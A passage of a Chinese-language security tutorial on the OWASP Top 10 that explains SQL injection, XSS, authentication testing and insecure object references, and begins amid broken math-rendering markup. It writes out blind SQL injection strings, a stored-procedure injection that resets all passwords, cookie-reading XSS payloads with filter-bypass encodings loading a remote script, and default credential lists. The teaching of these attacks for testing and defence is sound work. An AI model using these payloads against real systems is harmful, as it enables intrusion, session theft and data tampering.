mathvariant="normal">　</mi><mi mathvariant="normal">　</mi></mrow><annotation encoding="application/x-tex">Id&#x27;，假设我们想要得到用户名字段的值，那么通过一些函数，我们就可以逐字符的读取用户名的值。在这里我们使用以下的函数：
　　SUBSTRING (text, start, length)，ASCII (char)，LENGTH (text)
　　我们定义id为：
　　</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord"><span class="mord mathdefault">d</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">假</span><span class="mord cjk_fallback">设</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">想</span><span class="mord cjk_fallback">要</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">到</span><span class="mord cjk_fallback">用</span><span class="mord cjk_fallback">户</span><span class="mord cjk_fallback">名</span><span class="mord cjk_fallback">字</span><span class="mord cjk_fallback">段</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">值</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">那</span><span class="mord cjk_fallback">么</span><span class="mord cjk_fallback">通</span><span class="mord cjk_fallback">过</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">些</span><span class="mord cjk_fallback">函</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">逐</span><span class="mord cjk_fallback">字</span><span class="mord cjk_fallback">符</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">读</span><span class="mord cjk_fallback">取</span><span class="mord cjk_fallback">用</span><span class="mord cjk_fallback">户</span><span class="mord cjk_fallback">名</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">值</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">在</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">里</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">使</span><span class="mord cjk_fallback">用</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">下</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">函</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">：</span><span class="mord cjk_fallback">　</span><span class="mord cjk_fallback">　</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.10903em;">U</span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mord mathdefault">G</span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord mathdefault">x</span><span class="mord mathdefault">t</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">t</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">t</span><span class="mord mathdefault">h</span><span class="mclose">)</span><span class="mord cjk_fallback">，</span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathdefault">c</span><span class="mord mathdefault">h</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mclose">)</span><span class="mord cjk_fallback">，</span><span class="mord mathdefault">L</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mord mathdefault">G</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord mathdefault">x</span><span class="mord mathdefault">t</span><span class="mclose">)</span><span class="mord cjk_fallback">　</span><span class="mord cjk_fallback">　</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">定</span><span class="mord cjk_fallback">义</span><span class="mord mathdefault">i</span><span class="mord mathdefault">d</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">：</span><span class="mord cjk_fallback">　</span><span class="mord cjk_fallback">　</span></span></span></span>Id=1' AND ASCII(SUBSTRING(username,1,1))=97 AND '1'='1<br>
　　那么最终的SQL查询语句为：<br>
　　SELECT field1, field2, field3 FROM Users WHERE Id='1' AND ASCII(SUBSTRING(username,1,1))=97 AND '1'='1'<br>
　　那么，如果在数据库中有用户名的第一个字符的ASCII码为97的话，那么我们就能得到一个真值，那么我们就继续寻找该用户名的下一个字符；如果没有的话，那么我们就递增猜测第一个字符的ASCII码为98的用户名，这样反复下去就能判断出合法的用户名。<br>
　　那么，什么时候我们可以结束推理呢，我们假设id的值为：<br>
　　$Id=1' AND LENGTH(username)=N AND '1' = '1<br>
　　其中N是我们到目前为止已经分析的字符数目，那么整体的sql查询为：<br>
　　SELECT field1, field2, field3 FROM Users WHERE Id='1' AND LENGTH(username)=N AND '1' = '1'<br>
　　这个查询的返回值如果是真，那我们就已经完成了推理并且我们已经得到了想要的数值，如果为假，则表示我们还要继续分析。<br>
　　这种盲SQL注入会要求我们输入大量的sql尝试，有一些自动化的工具能够帮我们实现，SqlDumper就是这样的一种工具，对MySQL数据库进行GET访问请求。</p>
<p>存储过程注入<br>
　　在上一篇《如何防范SQL注入—编程篇》中，我们提到使用存储过程是能够防范SQL注入的，但同时也要注意，存储过程如果使用不得当，使用存储过程的动态查询事实上也会造成一定的SQL注入漏洞。<br>
　　以下面的SQL存储过程为例：<br>
　　Create procedure user_login @username varchar(20), @passwd varchar(20) As<br>
　　Declare @sqlstring varchar(250)<br>
　　Set @sqlstring = ‘<br>
　　Select 1 from users<br>
　　Where username = ‘ + @username + ‘ and passwd = ‘ + @passwd<br>
　　exec(@sqlstring)<br>
　　Go<br>
　　用户的输入如下：<br>
　　anyusername or 1=1'<br>
　　anypassword<br>
　　如果我们没有对输入进行验证，那么上面的语句就会返回数据库中的一条记录。<br>
　　我们再看下面的一条：<br>
　　Create procedure get_report @columnamelist varchar(7900) As<br>
　　Declare @sqlstring varchar(8000)<br>
　　Set @sqlstring = ‘<br>
　　Select ‘ + @columnamelist + ‘ from ReportTable‘<br>
　　exec(@sqlstring)<br>
　　Go<br>
　　如果用户输入是：<br>
　　1 from users; update users set password = 'password'; select *<br>
　　后面则显而易见，用户的所有密码都被更改且得到了报表信息。<br>
<strong>A2-跨站脚本（XSS）</strong><br>
排在OWASP TOP10第2位的是Cross Site Scripting（XSS），翻译成中文即“跨站脚本攻击”。它指的是恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意用户的特殊目的。XSS属于被动式的攻击，因为其被动且不好利用，所以许多人常忽略其危害性。<br>
以下内容转自百度空间的一篇关于OWASP的文章，个人觉得基本已经把跨站脚本攻击的内容阐述的比较清楚。<br>
如何寻找XSS漏洞，XSS攻击分成两类，一类是来自内部的攻击，主要指的是利用程序自身的漏洞，构造跨站语句，如:dvbbs的showerror.asp存在的跨站漏洞。另一类则是来来自外部的攻击，主要指的自己构造XSS跨站漏洞网页或者寻找非目标机以外的有跨站漏洞的网页。如当我们要渗透一个站点，我们自己构造一个有跨站漏洞的网页，然后构造跨站语句，通过结合其它技术，如社会工程学等，欺骗目标服务器的管理员打开，然后利用下面的技术得到一个shell。<br>
如何利用<br>
传统的跨站利用方式一般都是攻击者先构造一个跨站网页，然后在另一空间里放一个收集cookie的页面，接着结合其它技术让用户打开跨站页面以盗取用户的cookie，以便进一步的攻击。这种方式太过于落后，对于弊端大家可能都知道，因为即便你收集到了cookie你也未必能进一步渗透进去，多数的cookie里面的密码都是经过加密的，如果想要cookie欺骗的话，同样也要受到其它的条件的限约。而另一种思路，则从一定程度上解决上述的问题。比较成熟的方法是通过跨站构造一个表单，表单的内容则为利用程序的备份功能或者加管理员等功能得到一个高权限。下面将详细的介绍这种技术。<br>
寻找跨站漏洞<br>
如果有代码的话比较好办，我们主要看代码里对用户输入的地方和变量有没有做长度和对”&lt;”,”&gt;”,”;”,”’”等字符是否做过滤。还有要注意的是对于标签的闭合，像测试QQ群跨站漏洞的时候，你在标题处输入<script>alert(‘test’)</script>，代码是不会被执行的，因为在源代码里，有其它的标签未闭合，如少了一个</script>，这个时候，你只要闭合一个</script>，代码就会执行，如：你在标题处输入</script><script>alert(‘test’)</script>，这样就可以弹出一个test的框。<br>
如何利用<br>
跨站脚本(Cross-site scripting，XSS)漏洞是Web应用程序中最常见的漏洞之一。如果您的站点没有预防XSS漏洞的固定方法，那么就存在XSS漏洞。这个利用XSS漏洞的病毒之所以具有重要意义是因为，通常难以看到XSS漏洞的威胁，而该病毒则将其发挥得淋漓尽致。<br>
这个利用XSS漏洞的蠕虫病毒的特别之处在于它能够自我传播。myspace.com上的一个用户希望自己能够在网站的友人列表上更“受欢迎”。但是该用户不是通过普通的方法来结交新朋友，而是在自己的个人信息中添加了一些代码，导致其他人在访问他的页面时，会不知不觉地利用XSS漏洞将他加为好友。更恶劣的是，它会修改这些人的个人信息，使其他人在访问这些被感染的个人信息时，也会被感染。由于这种呈指数传播的方式，这种病毒才很快就被发现。<br>
很难预防站点中的XSS。因此一定要认真检查您的应用程序是否存在XSS漏洞。此外，WebLogic Server的encodeXSS()也可以有所帮助。可以试着针对所有牵涉到使用encodeXSS()或其他某个筛选方法的输出找出一种编码模式——找出对一种编码模式来说不正确的应用程序往往要比找出XSS漏洞要容易的多。更重要的是，不要认为，就因为XSS漏洞是一个常见问题，所以它危害不大。<br>
之所以出现XSS漏洞有两个原因。首先，HTML没有明确区分代码和数据。无法确定指出“这个字符串表示的是数据”。您可以将其放入引号中，但是数据是否包含引号呢？……其次，程序在将用户数据发送回浏览器时没有进行有效的转义。这导致包含有（例如说）引号的数据被放入页面中，从而引发了问题。而AJAX要提供的好处是，它包含一个专用渠道XML链接，其中全是数据而没有代码。这样，就有可能让客户端AJAX引擎负责对字符串进行转义、检测不正确的值，等等。说是这么说，直到AJAX更为成熟（可能也更为标准化）之前，它只会导致错误的编程和安全漏洞。<br>
XSS漏洞可能造成的后果包括窃取用户会话，窃取敏感信息，重写Web页面，重定向用户到钓鱼网站等，尤为严重的是，XSS漏洞可能使得攻击者能够安装XSS代理，从而攻击者能够观察到该网站上所有用户的行为，并能操控用户访问其他的恶意网站。<br>
对于XSS漏洞，我们有两种常见的措施，第一种就是消除漏洞，简而言之就是在输出页面上不提供任何用户的输入信息；另外一种就是想办法来抵御这种漏洞，可以采用对所有用户的输入编码后再输出（可以用OWASP的ESAPI），也可以对所有用户输入进行“白名单”验证，另外，OWASP还提供了AntiSamy对HTML页面做优化以消除这个漏洞。<br>
防范XSS跨站脚本攻击——测试篇<br>
XSS也是一种对浏览器的解释器的代码注入攻击，这些攻击能够通过HTML，JavaScript，VBScript，ActiveX，Flash等其他客户端语言执行，同时，这些攻击也可能造成用户信息泄露，配置更改，cookie窃取等造成危害，甚至能够用于对Web服务器进行DOS攻击。<br>
　　与大部分攻击不同的是，大部分攻击往往只涉及2方（攻击者和网站，攻击者和受害者），而XSS则涉及3方，攻击者、客户端、网站，XSS的目的就是窃取客户端的cookie或是其他信息以冒充客户在网站上进行认证，进而在网站上操作任何想进行的操作。<br>
　　下面我们看看到底有哪些类型的XSS攻击：<br>
　　Stored XSS（存储式跨站脚本攻击）<br>
　　这是最强大的一种XSS攻击，所谓存储跨站攻击是指用户提交给Web应用程序的数据首先就被永久的保存在服务器的数据库，文件系统或其他地方，后面且未做任何编码就能显示到Web页面，最典型的就是2005年在MySpace发现的XSS漏洞以及利用该漏洞的Samy MySpace Worm。<br>
　　举例，假设我们的网站允许我们给其他用户留言，但事实上我们没有留言而是写入了一段代码：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1628303366228.png" alt="" loading="lazy"><br>
那么服务器将会存储这些信息，当用户点击我们伪造的留言时，他的浏览器就会执行我们的脚本。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1628303359847.png" alt="" loading="lazy"><br>
Reflected XSS（反射跨站脚本攻击）<br>
　　这是最常见也是最知名的XSS攻击，当Web客户端提交数据后，服务器端立刻为这个客户生成结果页面，如果结果页面中包含未验证的客户端输入数据，那么就会允许客户端的脚本直接注入到动态页面中。传统的例子是站点搜索引擎，如果我们搜索一个包含特殊HTML字符的字符串时，通常在返回页面上仍然会有这个字符串来告知我们搜索的是什么，如果这些返回的字符串未被编码，那么，就会存在XSS漏洞了。<br>
　　初看上去，由于用户只能在自己的页面上注入代码，所以似乎这个漏洞并不严重，但是，只需一点点社会工程的方法，攻击者就能诱使用户访问一个在结果页面中注入了代码的URL，这就给了攻击者整个页面的权限。由于这种攻击往往会需要一些社会工程方法，所以研发人员往往不会太过看重，但是我们看如下的例子，在服务器上有如下代码：</p>
<pre><code>article.php?title=&lt;meta%20http-equiv=&quot;refresh&quot;%20content=&quot;0;&quot;&gt;
</code></pre>
<p>这就使得浏览器每3秒就刷新一次页面，而且是一个死循环的状态，这就形成了DOS攻击，导致Web服务器挂掉。<br>
　　DOM-Based XSS（基于DOM的XSS）<br>
　　这个漏洞往往存在于客户端脚本，如果一个Javascript脚本访问需要参数的URL，且需要将该信息用于写入自己的页面，且信息未被编码，那么就有可能存在这个漏洞。<br>
　　黑盒测试和示例：<br>
　　比较简单的测试是否存在XSS漏洞的方法是验证Web应用是否会对一个包含了HTTP响应的简单脚本的访问请求，例如，Sambar服务器（5.3）包含一个众所周知的XSS漏洞，我们向服务器发送如下的请求，从服务器端能够产生一个响应从而在Web浏览器中执行</p>
<pre><code>http://server/cgi-bin/testcgi.exe?&lt;SCRIPT&gt;alert(“Cookie”+document.cookie)&lt;/SCRIPT&gt;
</code></pre>
<p>这个脚本会在客户浏览器端被执行。<br>
　　我们再举个例子：<br>
　　由于Javascript是区分大小写的，有些人会尝试将所有字符转换为大写字符来避免XSS漏洞，在这时，我们最好还是使用VBScript，因为它是大小写不区分的：</p>
<pre><code>JavaScript.
&lt;script&gt;alert(document.cookie);&lt;/script&gt;
VBScript.
&lt;script. type=&quot;text/vbscript&quot;&gt;alert(DOCUMENT.COOKIE)&lt;/script&gt;
如果我们已经过滤了”&lt;”，或者是&lt;script，/script&gt;，那么我们就需要尝试各种编码方法了
&lt;script. src=http://www.example.com/malicious-code.js&gt;&lt;/script&gt;
%3cscript. src=http://www.example.com/malicious-code.js%3e%3c/script%3e
\x3cscript. src=http://www.example.com/malicious-code.js\x3e\x3c/script\x3e
</code></pre>
<p><strong>A3-错误的认证和会话管理</strong><br>
OWASP TOP10排名第3的威胁“遭破坏的认证和会话管理”，简而言之，就是攻击者窃听了我们访问HTTP时的用户名和密码，或者是我们的会话，从而得到sessionID，进而冒充用户进行Http访问的过程。<br>
由于HTTP本身是无状态的，也就是说HTTP的每次访问请求都是带有个人凭证的，而SessionID就是为了跟踪状态的，而sessionID本身是很容易在网络上被监听的到，所以攻击者往往通过监听sessionID来达到进一步攻击的目的。<br>
这些漏洞往往会存在于Web页面的“更改我的密码”、“记住我的密码”、“忘记密码”、“安全提问”、“注销登录”、“邮件地址”等环节上。<br>
那么，一般来说，如何来防范这种漏洞呢？<br>
第一，  我们要整体审视我们的架构<br>
        认证机制本身必须是简单、集中和标准化的；<br>
        使用容器提供给我们的标准session id；<br>
        确保在任何时候用SSL来保护我们的密码和session id<br>
第二，  验证认证的实现机制<br>
        检查SSL的实现方法<br>
        验证所有与认证相关的函数<br>
        确保“注销登录”的动作能够关闭所有的会话<br>
        使用OWASP的WebScrab来测试你的应用<br>
如何进行验证测试<br>
所谓认证，就是建立确信某物或某人是真实的这么一个过程，authentication来自于希腊语αυθεντικός，即真实的，可信的。认证本身依赖于多个认证因子，在计算机安全领域，认证意味着验证通讯发起者的数字身份，常见的认证过程就是用户登录认证，所谓认证测试就是理解系统中的认证机制并找到方法绕过该认证机制。<br>
认证测试需要考虑的点有很多，下面我们逐一来进行解释说明<br>
        在加密通道上传递密码<br>
原则上，用户的认证必须通过加密信道进行传输，我们在这里的目的不是要验证诸如HTTPS是否安全，我们要验证的仅仅是用户的认证信息是否已经被加密了。<br>
在用户登录时，最常见的方式是用户输入用户名和密码后，通过POST方法传输，一般来说，认证信息或者是通过不安全的HTTP传递，或者是通过加密的HTTPS传递。我们注意到，甚至有些网站在登录页面显示给我们的是HTTPS，但事实上却仍然是用HTTP的，最简单的方法就是用网络监听工具，如SnifferPro或Ethereal来判断是否是真实加密了。<br>
下面，我们用OWASP的WebScrab截取一些信息来做个例子<br>
假设，登录页面要求用户输入用户名和密码，然后有一个“提交”按钮，那么在WebScrab中我们得到如下的请求数据：</p>
<pre><code>POST http://www.example.com/AuthenticationServlet HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1.14) Gecko/20080404
Accept: text/xml,application/xml,application/xhtml+xml
Accept-Language: it-it,it;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Keep-Alive: 300
Connection: keep-alive
Referer: http://www.example.com/index.jsp
Cookie: JSESSIONID=LVrRRQQXgwyWpW7QMnS49vtW1yBdqn98CGlkP4jTvVCGdyPkmn3S!
Content-Type: application/x-www-form-urlencoded
Content-length: 64
delegated_service=218&amp;User=test&amp;Pass=test&amp;Submit=SUBMIT
</code></pre>
<p>在上面的数据中，我们可以看到，POST方法通过HTTP协议把数据发送到http://www.example.com/AuthenticationServlet，那么显然在这时，传送的数据没有进行加密，恶意用户通过监听网络就很容易得到用户名和密码。<br>
再看下一个例子，假设是用HTTPS协议，那么请求的头数据如下：</p>
<pre><code>POST https://www.example.com:443/cgi-bin/login.cgi HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1.14) Gecko/20080404
Accept: text/xml,application/xml,application/xhtml+xml,text/html
Accept-Language: it-it,it;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Keep-Alive: 300
Connection: keep-alive
Referer: https://www.example.com/cgi-bin/login.cgi
Cookie: language=English;
Content-Type: application/x-www-form-urlencoded
Content-length: 50
Command=Login&amp;User=test&amp;Pass=test
</code></pre>
<p>可见，上述例子中的数据经加密后被传送到https://www.example.com:443/cgi-bin/login.cgi，这就确保了数据是加密的而不被其他人所窃取。<br>
再看下面的一个例子，我们在一个可以通过HTTP协议访问到的页面上通过HTTPS协议来发送数据</p>
<pre><code>POST https://www.example.com:443/login.do HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1.14) Gecko/20080404
Accept: text/xml,application/xml,application/xhtml+xml,text/html
Accept-Language: it-it,it;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Keep-Alive: 300
Connection: keep-alive
Referer: http://www.example.com/homepage.do
Cookie: SERVTIMSESSIONID=s2JyLkvDJ9ZhX3yr5BJ3DFLkdphH0QNSJ3VQB6pLhjkW6F
Content-Type: application/x-www-form-urlencoded
Content-length: 45
User=test&amp;Pass=test&amp;portal=ExamplePortal
</code></pre>
<p>如上，我们看到，我们的请求通过HTTPS引向了https://www.example.com:443/login.do，但如果我们再看Referer的值，就发现我们是从HTTP页http://www.example.com/homepage.do过来的。在这种情况下，我们的浏览器窗口中并不会告诉我们现在使用的安全连接，而事实上我们却正在使用安全连接。<br>
在上面的例子中，如果我们用Get方法，那么所输入的用户名和密码将会以明文的方式显示在URL中，这显然是不可取的。那么，如果我们经由Get方法通过HTTPS来传递数据是否可行呢，看下面的数据</p>
<pre><code>GET https://www.example.com/success.html?user=test&amp;pass=test HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1.14) Gecko/20080404
Accept: text/xml,application/xml,application/xhtml+xml,text/html
Accept-Language: it-it,it;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Keep-Alive: 300
Connection: keep-alive
Referer: https://www.example.com/form.html
If-Modified-Since: Mon, 30 Jun 2008 07:55:11 GMT
If-None-Match: &quot;43a01-5b-4868915f&quot;
</code></pre>
<p>从上面的例子可以看到，用户名和密码都以明文的方式在URL里存在，而不像上面的几个例子中都在消息体中，但并不是说攻击者就可以很容易看到这些信息，TLS/SSL毕竟是安全性很高的协议，整个HTTP数据包是加密的，但仍然要注意的是这些用户名和密码在传输过程中会被存储在代理和服务器上，这也就有可能会泄露用户信息。<br>
        用户列举测试法<br>
这种测试，简而言之是通过与应用的认证机制的交互，尝试能否获得一些正确的用户名，这对后面我们会讲到的暴力破解很有效，确认了正确的用户名就能用暴力破解去尝试密码了。<br>
通常，WEB应用对于用户名正确的输入会有一些信息反馈，例如，如果我们输错了密码，那么有时会反馈告知我们系统存在该用户，或密码错误。所以，作为测试人员，就要尝试不同的请求来判断系统是否会有不同的返回。<br>
对于HTTP的响应消息测试：<br>
        输入正确的用户名和密码<br>
期望结果：使用WebScrab抓取服务器的返回信息（HTTP 200 Response,消息的长度）<br>
        输入正确的用户名/错误的密码<br>
期望结果：从浏览器我们往往会得到如下的返回<br>
或者是如下返回<br>
甚至是如下的返回<br>
Login for User foo: invalid password<br>
        输入不存在的用户名<br>
期望结果：返回可能如下<br>
或者是如下的消息<br>
Login failed for User foo: invalid Account<br>
通常情况下，对于不同的出错信息，服务器往往返回的消息是一样的，但如果不同，测试人员就要去尝试在什么情况下不同，如下：<br>
客户请求：正确用户/错误密码——&gt;服务器返回：密码错误<br>
客户请求：错误用户/错误密码——&gt;服务器返回：用户不存在。<br>
那么显然第一条就告诉我们我们输入的是正确的用户名，通过这种方式我们就可以获得一些正确的用户名信息。<br>
还有其他一些尝试列举的方法：<br>
        有些应用程序会返回一些特定的出错信息；<br>
        分析URL以及重定向URL<br>
如下面的URL：<br>
http://www.foo.com/err.jsp?User=baduser&amp;Error=0<br>
http://www.foo.com/err.jsp?User=gooduser&amp;Error=2<br>
上面两个URL都告诉我们到了错误页面，但上一条是Error值为0，下一条Error值为2，那么我们可以猜测我们获得了一个正确的用户名。<br>
        URI探测<br>
有时候，Web服务器在接受一个对目录访问请求时，根据目录是否存在会有不同的返回信息，例如在某些网站会给每个用户设定一个目录，那么我们如果尝试访问某个已存在的目录时，它可能的返回页面如下：<br>
403 Forbidden error code<br>
404 Not found error code<br>
举例：<br>
http://www.foo.com/account1-返回的出错信息: 403 Forbidden<br>
http://www.foo.com/account2-返回的出错信息: 404 file Not Found<br>
那么显然，account1是现实存在的。<br>
        探测性用户账户测试法<br>
众所周知，在系统中往往会有默认账户或者很容易被猜到的常用账户，而且往往很多用户会使用默认的密码，同样，有些应用系统的测试账户研发人员有时也会忘记删除。这个问题事实上是一个漏洞，而这种漏洞往往是由于以下原因造成的：<br>
        没有经验的IT工程师，他们往往不会更改安装的架构组件的缺省密码；<br>
        编程人员在应用中留有后门以便测试，但在发布时忘记删除；<br>
        系统的管理员和用户采用了很简单的密码；<br>
        系统有内嵌的，无法删除的内部用户名和密码<br>
        ……<br>
对于注入Cisco路由器或WebLogic等，他们都有一些默认的用户名和密码，我们可以直接尝试，对于一些我们根本不了解的应用，我们可以做如下尝试：<br>
        尝试以下系统管理员的常用账号——&quot;admin&quot;, &quot;administrator&quot;, &quot;root&quot;, &quot;system&quot;, &quot;guest&quot;, &quot;operator&quot;, &quot;super&quot;，&quot;qa&quot;, &quot;test&quot;, &quot;test1&quot;, &quot;testing&quot;，针对用户名和密码组合尝试，也可以尝试诸如&quot;password&quot;, &quot;pass123&quot;, &quot;password123&quot;, &quot;admin&quot;,或guest&quot;这些密码。如果这些都无法成功，我们可以写一些脚本来尝试类似的用户名和密码组合。<br>
        管理员的密码有时会与系统名字相关，如我们测试的应用系统叫“Obscurity”，那么可以尝试用户名/密码组合Obscurity/obscurity。<br>
        利用注册页面我们也可以猜测用户名和密码的格式和长度。<br>
        尝试上述提到的所有用户名和空密码。<br>
        查看页面的源文件，尝试找到所有引用到用户名和密码的信息，比如&quot;If username='admin' then starturl=/admin.asp else /index.asp&quot;<br>
        寻找那些源文件中注释中可能含有的用户名和密码信息；<br>
        …….<br>
        强力测试（暴力测试）<br>
任何一种技术，在不同的人手里运用所达到的效果是不同的，正如暴力测试，也叫暴力破解，安全服务人员和测试人员利用这种技术来验证是否存在漏洞，而攻击者则利用其来寻找漏洞。<br>
Web应用系统通常会有一些用户认证方式，这些方式包括证书、指纹、一次性令牌等等，但更多的，往往是用户名和密码的组合，这就使得暴力破解成为可能。<br>
在对Web应用系统做暴力测试时，首先我们需要了解的是系统的认证机制，通常Web系统会采用以下两种机制：<br>
        HTTP认证——包含基本存取认证和数字存取认证。<br>
        基于HTML表单的认证。<br>
我们下面对这些认证方式做一下简单介绍：<br>
基本存取认证<br>
基本存取认证假设假定用户会以用户名和密码的组合来表明自己的身份，当用户浏览器使用这种机制访问站点时，web服务器将会返回一个包含“WWW-Authenticate”头的401响应，且包含了一个“Basic”值，以及被保护的域名（例如，WWW-Authenticate: Basic realm=”wwwProtectedSite”）客户端会弹出一个需要用户输入该域用户名和密码的提示框。然后，客户端浏览器返回给服务器一个响应，响应包含“Authorization”头，还包含“Basic”值以及连接了用户名，冒号，密码的基于64位的编码（例如，Authorization: Basic b3dhc3A6cGFzc3dvcmQ=），但可惜的是，这个回复只要被攻击者监听到就很容易被解码。<br>
我们来看一下这个过程：<br>
1.客户端发送一个标准的HTTP请求<br>
GET /members/docs/file.pdf HTTP/1.1<br>
Host: target</p>
<ol>
<li>web服务器定位到访问的这个资源是在一个受保护的目录；<br>
3.服务器发送一个HTTP 401的认证请求；<br>
HTTP/1.1 401 Authorization Required<br>
Date: Sat, 04 Nov 2006 12:52:40 GMT<br>
WWW-Authenticate: Basic realm=&quot;User Realm&quot;<br>
Content-Length: 401<br>
Keep-Alive: timeout=15, max=100<br>
Connection: Keep-Alive<br>
Content-Type: text/html; charset=iso-8859-1<br>
4.浏览器弹出要求输入用户名和密码的数据窗口；<br>
5.用户输入用户名和密码后，包含以下数据后再次提交；<br>
GET /members/docs/file.pdf HTTP/1.1<br>
Host: target<br>
Authorization: Basic b3dhc3A6cGFzc3dvcmQ=<br>
6.服务器把客户信息和存储的信息进行比较；<br>
7.如果身份验证正确，服务器发回被请求的内容，如果失败，服务器将会返回HTTP<br>
<img src="https://jinqipiaopiao.github.io//post-images/1628303347049.png" alt="" loading="lazy"><br>
www.owasp.org_Image-basm-sessid.jpg_Basm-sessid<br>
<img src="https://jinqipiaopiao.github.io//post-images/1628303343493.png" alt="" loading="lazy"><br>
www.owasp.org_Image-basm-sessid2.jpg_Basm-sessid2<br>
A4-不安全的直接对象引用<br>
所谓“不安全的对象直接引用”，即Insecure direct object references，意指一个已经授权的用户，通过更改访问时的一个参数，从而访问到了原本其并没有得到授权的对象。Web应用往往在生成Web页面时会用它的真实名字，且并不会对所有的目标对象访问时来检查用户权限，所以这就造成了不安全的对象直接引用的漏洞。<br>
我们看如下的一个示例，也许这样就更容易理解什么是不安全的对象直接引用<br>
<img src="https://jinqipiaopiao.github.io//post-images/1628303337959.png" alt="" loading="lazy"><br>
攻击者发现他自己的参数是6065，即?acct=6065；<br>
他可以直接更改参数为6066，即?acct=6066；<br>
这样他就可以直接看到6066用户的账户信息了。</li>
</ol>
<p>一般来说，防止不安全的直接对象引用的方法有以下两种：<br>
使用非直接的对象引用——这防止了攻击者直接访问其并未授权的对象，通过一种mapping或是其他的方法让攻击者无法直接访问。<br>
检查访问——对每一个来自于不信任的源的直接对象引用都必须包含访问控制检查，从而确信该用户对该对象拥有访问权。</p>
<p><strong>A5-伪造跨站请求（CSRF）</strong><br>
跨站请求伪造，也被称成为“one click attack”或者session riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本（XSS），但它与XSS非常不同，并且攻击方式几乎相左。XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。与XSS攻击相比，CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比XSS更具危险性。<br>
